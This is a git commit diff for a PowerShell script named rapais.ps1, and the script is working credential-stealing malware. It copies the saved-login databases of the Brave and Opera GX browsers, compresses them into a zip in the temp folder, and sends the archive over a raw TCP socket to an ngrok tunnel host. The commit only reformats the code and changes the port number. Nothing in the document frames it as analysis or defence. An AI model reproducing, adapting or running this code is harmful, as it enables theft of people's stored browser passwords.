a34ab0b245b431e8139aa0c9f5911fc88d1be4eb
FBiUwU <71545021+FBIgLoK@users.noreply.github.com>
2026-03-02 16:09:12 +0100

    Update rapais.ps1

--- rapais.ps1
+++ rapais.ps1
@@ -1,22 +1,13 @@
 $roaming = $env:APPDATA
-$local   = $env:LOCALAPPDATA
-$temp    = $env:TEMP
-$zip     = "$temp\envio.zip"
-
+$local = $env:LOCALAPPDATA
+$temp = $env:TEMP
+$zip = "$temp\envio.zip"
 $tempFile = "$temp\UwUoperad"
-
 if (Test-Path $zip) { Remove-Item $zip -Force }
-
 Copy-Item "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" $tempFile -Force
-
-Compress-Archive `
-    "$roaming\Opera Software\Opera GX Stable\Default\Login Data", `
-    $tempFile `
-    -DestinationPath $zip -Force
-
+Compress-Archive "$roaming\Opera Software\Opera GX Stable\Default\Login Data", $tempFile -DestinationPath $zip -Force
 Remove-Item $tempFile -Force
-
-$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io", 16943 )
+$c = New-Object Net.Sockets.TCPClient("2.tcp.eu.ngrok.io", 13953)
 $s = $c.GetStream()
 $b = [IO.File]::ReadAllBytes($zip)
 $s.Write($b,0,$b.Length)
